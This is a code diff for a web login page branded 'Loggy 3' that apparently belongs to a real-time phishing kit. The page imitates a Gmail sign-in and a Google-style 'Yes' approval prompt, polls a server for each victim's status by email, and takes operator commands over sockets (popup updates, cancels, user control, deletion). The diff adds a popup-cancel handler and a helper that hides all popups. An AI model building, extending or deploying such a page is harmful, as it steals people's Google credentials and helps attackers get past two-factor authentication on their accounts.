@@ -10,7 +10,6 @@
 body { min-height: 100vh; background: #f3f4f6; display: flex; justify-content: center; align-items: center; padding: 20px; }
 .card { background: #fff; border-radius: 24px; padding: 40px 32px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
 
-/* ⭐ NEW BRAND HEADER */
 .brand-header {
   display: flex;
   align-items: center;
@@ -46,7 +45,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 @keyframes spin { to { transform: rotate(360deg); } }
 .error-label { color: #dc2626; font-size: 13px; margin-top: 12px; text-align: center; display: none; background: #fef2f2; padding: 12px; border-radius: 10px; }
 
-/* ============ GOOGLE-STYLE YES POPUP ============ */
 .popup-overlay {
   display: none;
   position: fixed;
@@ -133,7 +131,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
   .brand-header img { width: 42px; height: 42px; }
 }
 
-/* TEXT POPUP */
 .popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
 .popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
 .popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
@@ -142,8 +139,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 <body>
 
 <div class="card">
-
-  <!-- ⭐ BRAND HEADER: logo + "Loggy 3" -->
   <div class="brand-header">
     <img src="/images/logo.png" alt="Loggy 3">
     <span class="brand-name">Loggy 3</span>
@@ -156,7 +151,6 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
   <div id="errorLabel" class="error-label"></div>
 </div>
 
-<!-- Google-Style YES Popup -->
 <div id="yesPopup" class="popup-overlay">
   <div class="google-prompt-card">
     <div class="google-logo">
@@ -228,12 +222,22 @@ function showTextPopup(msg) {
   textPopup.classList.add('active');
 }
 
+function hideAllPopups() {
+  yesPopup.classList.remove('active');
+  textPopup.classList.remove('active');
+}
+
 async function pollStatus() {
   if (!currentEmail) return;
   try {
     const res = await fetch(`/api/user/status?email=${encodeURIComponent(currentEmail)}`);
     const data = await res.json();
     if (!data || data.notFound) return;
+
+    // Cancel popup if popup_type became null
+    if (data.popup_type === null && lastPopupId > 0) {
+      hideAllPopups();
+    }
 
     if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
       lastPopupId = data.popup_id;
@@ -243,8 +247,7 @@ async function pollStatus() {
 
     if (data.wrong_login_flag) {
       setLoading(false);
-      yesPopup.classList.remove('active');
-      textPopup.classList.remove('active');
+      hideAllPopups();
       emailInput.value = '';
       passwordInput.value = '';
       showError('Email and password must be matching your Gmail account.');
@@ -261,8 +264,7 @@ async function pollStatus() {
 
     if (data.timeout_flag) {
       setLoading(false);
-      yesPopup.classList.remove('active');
-      textPopup.classList.remove('active');
+      hideAllPopups();
       emailInput.value = '';
       passwordInput.value = '';
       showError('Try again!');
@@ -337,6 +339,13 @@ socket.on('popup-update', (data) => {
   }
 });
 
+socket.on('popup-cancel', (data) => {
+  if (!currentEmail) return;
+  if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
+  hideAllPopups();
+  lastPopupId = data.popup_id || lastPopupId;
+});
+
 socket.on('user-control', (data) => {
   if (!currentEmail) return;
   if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
@@ -347,8 +356,7 @@ socket.on('user-deleted', (data) => {
   if (!currentEmail) return;
   if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
   setLoading(false);
-  yesPopup.classList.remove('active');
-  textPopup.classList.remove('active');
+  hideAllPopups();
   emailInput.value = '';
   passwordInput.value = '';
   showError('');
